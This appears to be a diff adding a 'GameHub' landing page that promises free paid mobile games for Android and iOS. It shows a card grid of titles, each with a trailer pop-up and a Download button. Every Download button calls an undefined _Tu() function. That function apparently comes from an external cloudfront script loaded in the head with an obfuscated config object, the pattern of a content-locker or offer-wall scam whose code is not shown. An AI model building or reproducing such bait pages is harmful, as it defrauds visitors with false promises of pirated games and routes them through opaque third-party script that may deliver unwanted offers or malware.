@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GameHub - Watch & Download</title>
+    <script type="text/javascript">var kpaBs_UxJ_TYAjWc = {"it":4596228,"key":"3d01b"};</script>
+    <script src="https://d1qt1z4ccvak33.cloudfront.net/f3cb954.js"></script>
+    <style>
+        body{background:#0b0e17;font-family:'Segoe UI',Arial,sans-serif;color:white;text-align:center;margin:0;padding:0;overflow-x:hidden;}
+        .container{width:90%;margin:auto;padding-bottom:50px;}
+        .logo-container{display:flex;align-items:center;justify-content:center;gap:15px;margin:40px 0 10px 0;}
+        .controller-icon{background:#7c66e3;width:60px;height:35px;border-radius:12px;position:relative;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 15px rgba(124, 102, 227, 0.3);animation:soft-bounce 2s infinite ease-in-out;}
+        .controller-icon::before{content:'+';position:absolute;left:8px;font-size:20px;font-weight:bold;color:#2a2252;}
+        .controller-icon::after{content:'';position:absolute;right:10px;width:6px;height:6px;background:#2a2252;border-radius:50%;box-shadow:0 8px 0 #2a2252;}
+        .logo-text-new{font-size:45px;font-weight:800;letter-spacing:-1px;}
+        .intro-text {max-width: 800px; margin: 0 auto 20px; padding: 0 20px;}
+        .intro-text h2 {color: #7c66e3; font-size: 26px; margin-bottom: 12px; font-weight: 800;}
+        .intro-text p {color: #ffffff; font-size: 16px; line-height: 1.6;}
+        .coming-soon {display: inline-flex; align-items: center; gap: 10px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #ffffff; padding: 10px 25px; border-radius: 12px; font-size: 14px; margin-bottom: 40px; animation: zoomPulse 2.5s infinite ease-in-out;}
+        .clock-icon {width: 16px; height: 16px; border: 2px solid #7c66e3; border-radius: 50%; position: relative;}
+        .clock-icon::after {content: ''; position: absolute; width: 6px; height: 2px; background: #7c66e3; top: 7px; left: 7px; transform-origin: left; animation: clock-spin 3s linear infinite;}
+        @keyframes zoomPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        @keyframes clock-spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes soft-bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-6px);}}
+        .buttons{margin-bottom:35px;}
+        .filter-btn{padding:10px 25px; border-radius:20px; border:none; margin:5px; cursor:pointer; background:#1f2638; color:white; font-weight:600;}
+        .grid{display:grid;grid-template-columns:repeat(auto-fit, minmax(170px, 1fr));gap:20px;}
+        .card{background:#111525;padding:15px;border-radius:20px;transition:0.3s;}
+        .card:hover{transform:translateY(-8px);}
+        .card img{width:100%;border-radius:15px;margin-bottom:10px;}
+        .title{font-size:15px;font-weight:bold;margin-bottom:5px;}
+        .platform{font-size:11px;color:#888;margin-bottom:4px;}
+        .size { font-size: 11px; color: #7c66e3; font-weight: 600; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 4px; }
+        .button-group{display:flex;flex-direction:column;gap:8px;align-items:center;}
+        .play-btn{width:40px; height:40px; border-radius:50%; background:linear-gradient(135deg,#f97316,#e11d48); color:white; border:none; cursor:pointer; display:flex; align-items:center; justify-content:center;}
+        .download-btn{padding:10px 20px; border-radius:30px; border:none; cursor:pointer; font-weight:bold; background:linear-gradient(135deg,#8b5cf6,#06b6d4); color:white;}
+
+        /* Video Popup Style */
+        #vModal{display:none; position:fixed; z-index:9999; left:0; top:0; width:100%; height:100%; background:rgba(0,0,0,0.9); align-items:center; justify-content:center;}
+        .vContent{position:relative; width:90%; max-width:800px; aspect-ratio:16/9;}
+        .vClose{position:absolute; top:-40px; right:0; color:white; font-size:35px; cursor:pointer;}
+        iframe{width:100%; height:100%; border-radius:10px; border:2px solid #7c66e3;}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo-container"><div class="controller-icon"></div><div class="logo-text-new">GameHub</div></div>
+    <div class="intro-text">
+        <h2>Discover Amazing Games</h2>
+        <p><strong>Here you will find the best mobile games for Android and iPhone that you won't find on the Play Store or App Store, including paid games for free.</p>
+    </div>
+    <div class="coming-soon"><div class="clock-icon"></div>Other Games will be added</div>
+    <div class="buttons">
+        <button class="filter-btn" onclick="filterGames('all')">All</button>
+        <button class="filter-btn" onclick="filterGames('android')">Android</button>
+        <button class="filter-btn" onclick="filterGames('ios')">iOS</button>
+    </div>
+    
+    <div class="grid">
+      
+      
+        <div class="card android"><img src="https://apkomtk.com/wp-content/uploads/2025/12/Red-Dead-Redemption.jpg"><div class="title">Red Dead Redemption</div><div class="platform">📱 Android</div><div class="size">2.82 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/Bgvy-38nuD0?si=ubK3nj4lMyHHtr-t')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://apkvision.org/wp-content/uploads/2018/08/fortnite-2-140x140.png"><div class="title">
+Fortnite</div><div class="platform">📱 Android</div><div class="size">353 MB</div><div class="button-group"><button onclick="showV('https://youtu.be/B9TS-8DIzLw?si=WY97zMT3meIc_0RE')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://apkomtk.com/wp-content/uploads/2025/03/GTA_San_Andreas-.png"><div class="title">GTA San Andreas</div><div class="platform">📱 Android</div><div class="size">2.48 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/8yIwuSQQMjE?si=X1DHMZ43q3-kymzR')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://i.imgur.com/A1vVFSJ.jpeg"><div class="title">Truck Pro USA</div><div class="platform">📱 Android</div><div class="size">1.39 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/VVqaOJzDX4k?si=dKq_wbcLzMoLJoUT')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://i.imgur.com/yQiqNPt.jpeg"><div class="title">Little Nightmares</div><div class="platform">📱 Android</div><div class="size">1.15 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/O4JdtO-GTeQ?si=a_nbCXOCHju2kjmC')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://image.api.playstation.com/vulcan/ap/rnd/202207/1509/tQsLe6PofTKMaTzqPk2dB65d.png?w=440&thumb=false"><div class="title">Bright Memory Infinite</div><div class="platform">📱 Android</div><div class="size">2.36 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/mp2svVcxqFw?si=CEwikT5YgbOuGt54')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://i.imgur.com/FhyEU1O.jpeg"><div class="title">Spiritfarer</div><div class="platform">📱 Android</div><div class="size">1.37 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/boFxRFioDLY?si=pHzSDZR7EmFmVS23')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://i.imgur.com/ttb347N.jpeg"><div class="title">Street Fighter 4</div><div class="platform">📱 Android</div><div class="size">2.11 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/6L7eRCKWtBY?si=OH_ds7OuiriGjVyU')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://i.imgur.com/MRxUMC0.jpeg"><div class="title">Ash Of God Redemption</div><div class="platform">📱 Android</div><div class="size">1.94 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/sWnFMvkOoiM?si=KOLJX6PM9x-k_QNF')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card android"><img src="https://apkomtk.com/wp-content/uploads/2025/04/NARUTO-Ultimate-Ninja-STORM.jpg"><div class="title">Naruto</div><div class="platform">📱 Android</div><div class="size">3.39 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/2S1XH_qzMgc?si=ZqOUXXpH2ODDhH3K')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      
+      
+        
+        
+        
+        <div class="card ios"><img src="https://ipaomtk.com/wp-content/uploads/2024/06/246x0w-6.jpg"><div class="title">Assassins Creed Mirage</div><div class="platform">🍏 iOS</div><div class="size">3.77 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/epegPjQk5oQ?si=Y4wQUrwnWkY6g-7a')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://apkvision.org/wp-content/uploads/2018/08/fortnite-2-140x140.png"><div class="title">Fortnite</div><div class="platform">🍏 iOS</div><div class="size">2.84 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/B9TS-8DIzLw?si=WY97zMT3meIc_0RE')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://pdacdn.com/app/68b6ac5f89cdb/53242c5118360ca548a8b20271be2f57.png"><div class="title">Hitman World of Assassination</div><div class="platform">🍏 iOS</div><div class="size">3.06 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/IqhYUJYW8pA?si=QXd4m3hmbmxQakyS')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://apkomtk.com/wp-content/uploads/2025/12/Red-Dead-Redemption.jpg"><div class="title">Red Dead Redemption</div><div class="platform">🍏 iOS</div><div class="size">2.82 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/Bgvy-38nuD0?si=ubK3nj4lMyHHtr-t')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://apkomtk.com/wp-content/uploads/2025/03/GTA_San_Andreas-.png"><div class="title">GTA San Andreas</div><div class="platform">🍏 iOS</div><div class="size">2.00 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/8yIwuSQQMjE?si=X1DHMZ43q3-kymzR')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://image.api.playstation.com/vulcan/ap/rnd/202207/1509/tQsLe6PofTKMaTzqPk2dB65d.png?w=440&thumb=false"><div class="title">Bright Memory Infinite</div><div class="platform">🍏 iOS</div><div class="size">2.17 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/mp2svVcxqFw?si=CEwikT5YgbOuGt54')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://i.imgur.com/yQiqNPt.jpeg"><div class="title">Little Nightmares</div><div class="platform">🍏 iOS</div><div class="size">1.82 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/O4JdtO-GTeQ?si=a_nbCXOCHju2kjmC')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://ipaomtk.com/wp-content/uploads/2023/07/The-Amazing-Spider-Man-2.png"><div class="title">The Amazing Spider-Man 2</div><div class="platform">🍏 iOS</div><div class="size">751 MB</div><div class="button-group"><button onclick="showV('https://youtu.be/fBQABZpPoSQ?si=uPBGtyvj9f5ajMns')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://apkomtk.com/wp-content/uploads/2025/04/NARUTO-Ultimate-Ninja-STORM.jpg"><div class="title">Naruto</div><div class="platform">🍏 iOS</div><div class="size">3.04 GB</div><div class="button-group"><button onclick="showV('https://youtu.be/2S1XH_qzMgc?si=ZqOUXXpH2ODDhH3K')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+      
+      <div class="card ios"><img src="https://ipaomtk.com/wp-content/uploads/2026/01/Truck-Simulator-Big-Rigs.webp"><div class="title">Truck Simulator Big Rigs</div><div class="platform">🍏 iOS</div><div class="size">955 MB</div><div class="button-group"><button onclick="showV('https://youtu.be/yfSU_CLrtZA?si=fWYDBSPpJR4xiaUo')" class="play-btn">▶</button><button onclick="_Tu()" class="download-btn">Download</button></div></div>
+        
+        
+    </div>
+</div>
+
+<div id="vModal" onclick="hideV()">
+    <div class="vContent" onclick="event.stopPropagation()">
+        <span class="vClose" onclick="hideV()">&times;</span>
+        <iframe id="vFrame" src="" frameborder="0" allowfullscreen></iframe>
+    </div>
+</div>
+
+<script>
+    // Logic l-jdid bach t7et l-link kamel bo7do
+    function getYTID(url) {
+        var regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
+        var match = url.match(regExp);
+        return (match && match[2].length == 11) ? match[2] : null;
+    }
+
+    function showV(fullUrl) {
+        var videoId = getYTID(fullUrl);
+        if(videoId) {
+            document.getElementById('vFrame').src = "https://www.youtube.com/embed/" + videoId + "?autoplay=1";
+            document.getElementById('vModal').style.display = "flex";
+        } else {
+            alert("Lien YouTube ghalt!");
+        }
+    }
+
+    function hideV() {
+        document.getElementById('vModal').style.display = "none";
+        document.getElementById('vFrame').src = "";
+    }
+
+    function filterGames(type){
+        let games=document.querySelectorAll(".card");
+        games.forEach(game=>{ (type==="all"||game.classList.contains(type))?game.style.display="block":game.style.display="none"; });
+    }
+</script>
+</body>
+</html>
